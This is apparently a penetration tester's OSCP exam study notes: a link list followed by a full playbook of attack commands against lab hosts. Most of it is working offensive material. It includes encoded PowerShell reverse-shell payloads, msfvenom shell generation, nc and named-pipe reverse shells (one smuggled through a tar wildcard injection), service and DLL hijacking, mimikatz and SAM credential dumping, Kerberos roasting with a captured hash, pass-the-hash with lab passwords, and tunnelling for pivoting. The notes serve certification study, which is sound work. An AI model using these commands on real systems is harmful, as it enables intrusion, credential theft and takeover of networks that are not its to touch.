### study guides
- TJnull study guide: https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#section-17-port-redirection-and-pivoting
- Awesome cheat sheet: https://www.linkedin.com/pulse/muhammad-nomans-oscp-journey-comprehensive-review-110-noman-khalid-9ksgf/
- OSCP general cheat sheet (ok): https://github.com/akenofu/OSCP-Cheat-Sheet
- OSCP cheat sheet: https://gitlab.com/lagarian.smith/oscp-cheat-sheet/-/blob/master/OSCP_Notes.md#port-21-ftp
- Generic study guide: https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-main.md
- ippsec videos: https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
- Report template: https://gitlab.com/lagarian.smith/oscp-cheat-sheet/-/blob/master/OSCP-exam-report-template_whoisflynn_v3.2.md?ref_type=heads
- Cheatsheet (includes important file locations): https://github.com/saisathvik1/OSCP-Cheatsheet
### helpful scripts/tools
- Invoke-PowerShellTcp.ps1: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
- sharphound.ps1: https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
- ligolo: https://github.com/nicocha30/ligolo-ng/releases
- rubeus: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe
- powerview.ps1: https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1
- enum4linux: https://www.kali.org/tools/enum4linux/
- onetwopunch: https://github.com/superkojiman/onetwopunch
### enumeration
- SNMP: https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
- SNMP RCE: https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce
- Awesome port list: https://github.com/dashagriiva/OSCP-Prep-1/blob/master/ServicesPortsList.txt - also this guy has other cheat sheets
- pentesting SNMP: https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp#modifying-snmp-values
### password cracking
- Cracking VNC: https://www.hackingarticles.in/password-crackingvnc/
- hashcat modes: https://hashcat.net/wiki/doku.php?id=hashcat
### wordlists
- https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt
- Rockyou (link downloads): https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
- Fasttrack: https://raw.githubusercontent.com/drtychai/wordlists/master/fasttrack.txt
### shells
- reverse shell cheatsheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- reverse shells cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- powershell shells: https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows#powershell-shells
- php shell: https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php
- 
### pivoting
- Ligolo (includes double pivot) https://4pfsec.com/ligolo
- Pass the hash: https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/
- crackmapexec cheat sheet: https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
- Port forwarding cheat sheet: https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-port-fowarding.md
### linux privesc
- Socket command injection: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/socket-command-injection
- linux privesc cheat sheet: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
- GTFOBins: https://gtfobins.github.io/
### windows privesc
- Best cheat sheet: https://sushant747.gitbooks.io/total-oscp-guide/content/cmd.html
- Windows privesc: https://github.com/evets007/OSCP-Prep-cheatsheet/blob/master/windows-privesc.md
-  Windows privesc cheat sheet: https://rednode.com/privilege-escalation/windows-privilege-escalation-cheat-sheet/
 - windows privesc cheat sheet: https://github.com/evets007/OSCP-Prep-cheatsheet/blob/master/windows-privesc.md
 - windows privesc: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 - potatoes: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
 - DLL hijacking: https://notchxor.github.io/oscp-notes/4-win-privesc/6-dll-hijacking/
- Abuse kerberos using impacket: https://www.hackingarticles.in/abusing-kerberos-using-impacket/
- crackmapexec: https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
- impacket: https://tools.thehacker.recipes/impacket
### active directory
- active directory cheat sheet: https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md

### Initial enumeration
- scan common ports on machines in the external network, `-p-` for all ports, also scan UDP, scan for basic vulnerabilities
- fingerprint webservices
	- make note of http titles as well, could help identify cms/plugins etc
	- find inputs for sql injection/command injection
	- find file uploads
	- find file params for LFI RFI
```bash
nmap 192.168.248.225
sudo nmap -sU --open -p 161 192.168.248.225
sudo nmap -p- -Pn 192.168.248.225 -sS -T 5 --verbose
nmap -sT -A -p 80,8090 192.168.248.225
nikto -host 192.168.248.225 -port 8090
sudo nmap -sV -p 8090 --script "vuln" 192.168.248.225
sudo nmap -O 192.168.211.150 --osscan-guess
```
- run whatweb for CMS identification
	- with fingerprinting/cms info find CVEs for those technologies or CMS vulnerabilities (plugins etc)
```bash
whatweb 192.168.248.225:8090
```
- use gobuster/feroxbuster to find directories/paths for web services
	- also check for files like pdfs
	- use exiftool to gain more info and pdftotext 
	- do more fuzzing if necessary
```bash
gobuster dir -u http://192.168.248.225:8090 -w /usr/share/wordlists/dirb/big.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.248.225:8090

gobuster dir -u http://192.168.229.199:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf

# inspect any downloaded PDFs
exiftool -a -u info.pdf
pdftotext umbraco.pdf
```
- Enumerate any other open ports (SMB, VNC, SNMP, msql, ftp etc)
```bash
# enumerate vnc
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900 192.168.240.220
hydra -s 5900 -P /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt -t 16 192.168.240.220 vnc
vncviewer 192.168.229.220::5901

# enumerate smb
enum4linux 192.168.240.220
nmap -v -p 139,445 --script smb-os-discovery 192.168.240.220
nmap --script=smb-enum* --script-args=unsafe=1 -T5 192.168.194.147
smbclient -L 192.168.186.220 -U skylark
smbmap -H 192.168.240.220

# enumerate ftp
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.194.147
# format of wordlist is user:password, so use -C option
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.211.149 ftp
# source /usr/share/sparta/wordlists/ftp-default-userpass.txt 
hydra -s 21 -C ftp-wordlist.txt 192.168.211.149 ftp

# enumerate snmp
sudo apt-get install snmp-mibs-downloader
snmp-check 192.168.211.149 -c public
snmpwalk -c public -v1 -t 10 192.168.211.149
snmpwalk -c public -v2c -t 10 192.168.211.149
# get passwords
snmpwalk -c public -v1 -t 10 192.168.211.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
nmap --script "snmp* and not snmp-brute" 192.168.211.149
```
- searchsploit AND google for services, ports and exploits
```bash
# searchsploit example
searchsploit -m 47799
python3 47799.py 192.168.190.151 whoami 

# prepare encoded powershell command to catch shell
python3 47799.py 192.168.190.151 "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMwA0ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```
- LFI, RFI and directory traversal are all separate things, and are tested separately
- check for SMB hash attack via url params
```
# from target hit our smb server
 copy \\192.168.45.219\smb\test.txt
 
# use responder or impacket to catch NTLM
sudo impacket-smbserver -smb2support smb smb
sudo responder -I tun0
```

### Generating shells (msvenom)
```bash
# this produces shell code (don't need this much)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.234 LPORT=22 -f sh -o shell.sh

# this produces a bash one-liner
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.234 LPORT=4444 -f raw -o shell.sh

# windows shells
# meterpreter staged
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.219 LPORT=4444 -f exe -o met.exe
# shell unstaged
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.194 LPORT=4444 -f exe > reverse2.exe
# shell staged
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.181 LPORT=443 -f exe -o staged.exe
```
### Catching shells with msfconsole
```bash
sudo msfconsole
use multi/handler
set payload windows/x64/shell/reverse_tcp
set LHOST 192.168.45.181
set LPORT 443
run -j
```

### Windows privesc
- check for users and groups
```bash
whoami /groups
net user
net localgroup
```
- check if access to internal network
```bash
systeminfo
ipconfig /all
route print
netstat -ano
```
- run winpeas for initial overview of system
```bash
iwr -uri http://192.168.45.242:8000/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```
- look for Se privs
	- if SeImpersonate, try to use printSpoofer or one of the potatos
```bash
whoami /priv

# EFS potato
iwr -uri http://192.168.45.234/efspotato.cs -Outfile efspotato.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs

iwr -uri http://192.168.45.234/nc.exe -Outfile nc.exe

.\efspotato.exe whoami
.\efspotato.exe "nc.exe 192.168.45.234 5555 -e cmd"

# printspoofer
iwr -uri http://192.168.45.242/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe

# GodPotato
iwr -uri http://192.168.45.219/godpotato.exe -Outfile god.exe
iwr -uri http://192.168.45.219/nc.exe -Outfile nc.exe

.\god.exe -cmd "cmd /c whoami"
.\god.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.219 9999"
```
- look for hidden files that may contain passwords
```bash
Get-ChildItem -Path C:\staging\htdocs -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.conf,*.conf.bak -File -Recurse -ErrorAction SilentlyContinue
```
- look for odd running programs 
	- do they have write access? (use icacls)
	- do they have missing dlls?
		- if so use procmon to check for missing dlls
	- can they be started/stopped?
	- can use powerup to verify we can replace programs
	- unquoted service paths
```bash
# get programs and perms (want F or C or even M)
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls C:\Services\EnterpriseService.exe

# Unquoted services
# find services
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
# check for write perms on directories
icacls "C:\"
icacls "C:\Enterprise Software"
icacls "C:\Enterprise Software\Monitoring Solution" # has write
icacls "C:\Enterprise Software\Monitoring Solution\Surveillance Apps"
# add user or create and download shell
iwr -uri http://192.168.45.181/adduser.exe -Outfile Surveillance.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.229 LPORT=444 -f exe > Development.exe
# restart services
Restart-Service ReynhSurveillance 
sc.exe start DevService

# missing DLL
# need to copy the files over to a winprep box to see where the missing DLL is using procmon
# we only need to be able to stop/start the service, write perms not needed
New-Item -ItemType Directory -Path C:\Scheduler
iwr -uri http://192.168.45.219:8000/scheduler.exe -Outfile C:\Scheduler\scheduler.exe
iwr -uri http://192.168.45.219:8000/customlib.dll -Outfile C:\Scheduler\customlib.dll
# need to create the service in order to see missing dlls
New-Service -Name scheduler -BinaryPathName C:\Scheduler\scheduler.exe
# with procmon filter running we can restart the service
Restart-Service scheduler
# shell dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.181 LPORT=4444 -f dll -o EnterpriseServiceOptional.dll 
iwr -uri http://192.168.45.219:8000/EnterpriseServiceOptional.exe -Outfile EnterpriseServiceOptional.exe
# add user dll
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
iwr -uri http://192.168.45.181/myDLL.dll -Outfile myDLL.dll
# restart service to pick up our shell dll (3 different ways to restart)
net stop scheduler
Restart-Service scheduler
wmic service NAMEOFSERVICE call startservice

```
- look for scheduled tasks
```bash
# get scheduled tasks
Get-ScheduledTask
schtasks /query /fo LIST /v
schtasks.exe /query /V /FO CSV | convertfrom-csv | where{$_.'Run as user' -match 'roy'} | select taskname
```
- check powershell history for secrets
```bash
(Get-PSReadlineOption).HistorySavePath

type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
- check for presence of .kdbx files
```bash
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
- identify if there are any internal web services - always check default admin creds
- note there may be AV protection blocking our scripts
```bash
netsh firewall show state
```
- check for kernel exploits
```
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
### Linux privesc
- obtain TTY shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- check for access to internal network
- run linpeas for initial overview
	- check exploits in output
	- check sudo version exploits
```bash
cp /usr/share/peass/linpeas/linpeas.sh .
wget http://192.168.45.242/linpeas.sh
chmod +x ./linpeas.sh
```
- look for world-writable scripts executed as root, can be replaced with shell
```bash
# World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
find / -type f -perm 0777
# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null

# check world writable directories
/tmp
/var/tmp
/dev/shm
/var/spool/vbox
/var/spool/samba
```
- look for user's sudo perms and see if we can switch other users on the system
	- check allowed sudo programs with GTFO bins for exploits
```bash
sudo -l
su test

# examples of exploitable programs
awk
bash
cp
find
ht
less
more nano
man
nc
nmap
sh
vi/vim
```
- look at interesting programs and their config files (unusual SUID), user installed software
```bash
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/
```
- look for internal webservers - always check default admin creds
```bash
netstat -anlp
netstat -ano
```
- look for setuid binaries and capabilities
	- see if there are exploits on gtfo bins
```
# check capabilities (want cap_setuid+ep)
getcap -r / 2>/dev/null 

# check suid binaries
find / -perm -u=s -type f 2>/dev/null

# spawn root shell if these if suid marked
nmap
vim
less 
more
nano 
cp 
mv 
find

# exploit these
```
- check for crons
```bash
cat /etc/crontab
grep "CRON" /var/log/syslog
ls -lah /etc/cron*
crontab -l
sudo crontab -l
```
- check history
```bash
history
cat .bashrc
```
- run pspy and look for processes running as root
```bash
https://github.com/DominicBreuker/pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
wget http://192.168.45.229/pspy64 -O pspy
```
- check for plaintext passwords
	- if `adm` group check logfiles
```bash
grep --color=auto -rnw '/home/archive' -iIe "PASSWORD" --color=always 2>/dev/null
```
- bad path configuration
	- Putting `.` in the path
- check for dirty pipe exploit  
	- https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
	- https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
- check sudo version for exploit 
	- https://www.exploit-db.com/exploits/49521
	- https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py
- check for tar wildcard exploit
	- would be exposed o
```bash
# exploit wildcards
# https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c
# https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
# from /opt/admin
echo "mkfifo /tmp/lhennp; nc 192.168.45.234 9999 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"  
echo "" > --checkpoint=1
```
- check for kernel exploits
	- -determine the OS, arch, version for exploits and make sure you know how the distro works for example freeBSD
```bash
uname -a
cat /proc/version
cat /etc/issue
```

### Pivoting
- use found credentials
	- spray with crackmapexec smb (use --local-auth if not a domain user)
	- use crowbar to test RDP access
- if creds are a match, gain shell
	- if port 5986/5985 - winrm, evil-winrm
	- if only port 445 crackmapexec smb -X to run a shell
	- if crowbar success, use RDP
	- impacket psexec etc
- check all open ports and services including smtp, ftp, smb, webservers, rdp, ssh
- double check high ports
- if we have mail server creds we may be able to phish
- pivoting with obtained creds:
```bash
# smb
crackmapexec smb 10.10.76.13 -u backup_service -p It4Server --continue-on-success
impacket-smbexec sql_svc:Dolphin1@10.10.80.148
smbclient -L //10.10.80.148/ -U sql_svc --password=Dolphin1
# get a shell
crackmapexec smb  172.16.104.30 -u Administrator -p admin-password.txt -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

# winrm
crackmapexec winrm 10.10.76.13 -u backup_service -p It4Server --continue-on-success
evil-winrm -i 10.10.80.148 -u sql_svc -p "Dolphin1"

# pass the hash
impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@10.10.76.13 
impacket-wmiexec -hashes :9a3121977ee93af56ebd0ef4f527a35e mary.williams@192.168.225.141

# rdp
crowbar -b rdp -s 10.10.80.148/32 -u sql_svc -c "Dolphin1" -n 1
xfreerdp /u:Administrator /p:DowntownAbbey1923 /d:SKYLARK /v:192.168.194.227

# mssql
crackmapexec mssql -d oscp.exam -u sql_svc -p 'Dolphin1' -X "whoami" 10.10.80.148
impacket-mssqlclient sql_svc:Dolphin1@10.10.80.148 -windows-auth
```
- tunneling to pivot with chisel (also for accessing internal web server)
```bash
# try to access internal web server running at 127.0.0.1:8000
chisel server --port 8081 --reverse
sudo tcpdump -nvvvXi tun0 tcp port 8081
wget http://192.168.45.234/chisel -O chisel

# access the internal webpage at 127.0.0.1:8001 - might not be able to access the webpage but the exploits will still work
./chisel
# may need to set up chisel server using the target's open ports
./chisel client 192.168.45.160:80 R:60002:0.0.0.0:60002

# use with proxychains for scanning internal networks
iwr -uri http://192.168.45.242:8000/chisel.exe -Outfile chisel.exe
.\chisel.exe client 192.168.45.242:8081 R:socks

cat /etc/proxychains4.conf
# socks5 127.0.0.1 1080
```
- tunneling to pivot with ligolo (and double pivot)
```bash
# from kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
# from proxy on kali
>> session
>> start

# add route to internal network
sudo ip route add 172.16.104.0/24 dev ligolo

# check route
ip route

# delete old routes
sudo ip route del 172.16.78.0/24 dev ligolo

# from windows target
iwr -uri http://192.168.45.219:8000/agent.exe -Outfile agent.exe
./agent.exe -ignore-cert -connect 192.168.45.219:11601

# linux version
wget http://192.168.45.229/agent -O agent
chmod +x agent
# connect to the first machine we proxied to from kali
./agent -connect 192.168.194.221:11601 -ignore-cert

# double pivot
# add listener to ligolo
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# download agent on the second machine and connect to first machine
wget http://192.168.45.229/agent -O agent
chmod +x agent
./agent -connect 192.168.194.221:11601 -ignore-cert

# from kali
session
# switch to newly added session

# add route to access
sudo ip route add 10.20.119.0/24 dev ligolo
```
- simple port forward if you can't download files on one machine due to restricted network
```bash
# listening socket then forwarding socket, then ssh server - run this from kali to forward port 4444 on kali to a new port 4444 on web svc. sql service can only talk to web service, but not kali
ssh -N -R 4444:127.0.0.1:4444 web_svc@192.168.220.147
```
- proxychains 
```bash
cat /etc/proxychains4.conf
# socks5 127.0.0.1 1080
```
### Active Directory 
- user powerview to gain more info on domain users
- determine if service accounts (iis_service) have higher privs
- look at domain shares
- look at user acls

### Post exploition (windows)
- determine if domain joined, if so run bloodhound to gather data as soon as possible
	-  this can determine if we can do kerb or aspreproasting on certain users
	- determine who are the domain users
	- determine shortest path to domain controller
	- see who has active sessions
```bash
# collect data from windows
powershell -ep bypass
.\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# transfer to kali
net use \\192.168.45.242\smb
copy 20231114113128_BloodHound.zip \\192.168.45.242\smb

# analyze on kali
sudo neo4j start
bloodhound
```
- mimikatz to gain NTLM hashes
```bash
iwr -uri http://192.168.45.217:8000/mimikatz.exe -Outfile mimikatz.exe
. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::cache 
token::elevate
lsadump::sam

# oneliner (if using evil-winrm)
./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "exit" >> mm.txt

# crack hash or use it in pass-the-hash
hashcat -m 1000 joe.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
- look for hidden kdbx, passwords in files when you are higher priv
```bash
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# copy to kali and extract master password, which we can use to login and obtain more passwords
net use \\192.168.45.219\smb
copy Database.kdbx \\192.168.45.219\smb

keepass2john Database.kdbx > keepass2.hash
hashcat -m 13400 keepass2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# got password - mercedes1
sudo apt search keepass cli
sudo apt-get install kpcli
kpcli --kdb=/home/kali/relia/Database2.kdbx
cd /Database/General
show 0
```
- Obtain sam files (windows) and extract hashes
```bash
# look for SAM files
%SYSTEMROOT%\repair\SAM  
%SYSTEMROOT%\System32\config\RegBack\SAM  
%SYSTEMROOT%\System32\config\SAM  
%SYSTEMROOT%\repair\system  
%SYSTEMROOT%\System32\config\SYSTEM  
%SYSTEMROOT%\System32\config\RegBack\system  

# found in %SYSTEMROOT%\System32\config\SAM  
# cannot extract hashes however
cd C:\Windows\System32\config
download SAM
download SYSTEM
reg save hklm\sam C:\Users\Administrator\sam
reg save hklm\system C:\Users\Administrator\system
pypykatz registry --sam sam system
impacket-secretsdump -sam sam -system system
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```
- as-rep roasting
	- can use impacket or rubeus to gain NTLM hashes
	- can determine this from bloodhound results
```bash
# if you have DC IP
impacket-GetNPUsers -dc-ip 192.168.214.14  -request -outputfile hashes.asreproast relia.com/jim

# determine if we can as-rep roast any users
wget https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1

iwr -uri http://192.168.45.219:8000/PowerView.ps1 -Outfile PowerView.ps1
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired
Get-Module -ListAvailable

# try on windows host with rubeus
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe

iwr -uri http://192.168.45.219:8000/Rubeus.exe -Outfile Rubeus.exe

.\rubeus.exe asreproast /nowrap

# get michelle's hash
$krb5asrep$michelle@relia.com:79E53520A15B4689C962B90611570895$E09A752854E0E23F3914E16104862DF7B85A8A81D2BFFA8DC46E3498BEAF98A069DC1979D1D268557C94DF38694A74A2A50460D72A9EE764FECF6D0E8CCBCAC1FC80578D714D7C291B587D1A10624957034C22FFDA35698560ED92A6B280CF74F169F38C03EE4C86406205CE07CA06498B7FDC2B1CA843BC43E2C8BEA4055F3CD5502FB1B3A64529360335CDE731C59357928AF4595D833636BC5C5046B385C0BFD3048BBE8AE7EC07BA301CBEB32FF64F57FC0C5E41A9AF5A407BD6CB1BEEEB0DF59EDC5B7FD64B44CA53B5BD20FB451ABF5CECB19A2EE07BDC10E917AFD4B0976D55D0F665

# save to file michelle.hash - get NotMyPassword0k?
sudo hashcat -m 18200 michelle.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
- kerberoasting
	- also gain this from bloodhound results
```bash
iwr -uri http://192.168.45.219/Rubeus.exe -Outfile Rubeus.exe
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
copy hashes.kerberoast \\192.168.45.219\smb

# crack the hash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r rule1 --force

```
- find passwords on the filesystem
```
Get-ChildItem -Path C:\Users -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

### Post exploitation (linux)
- Find passwords on filesystem
```bash
grep --color=auto -rnw '/home/archive' -iIe "PASSWORD" --color=always 2>/dev/null
```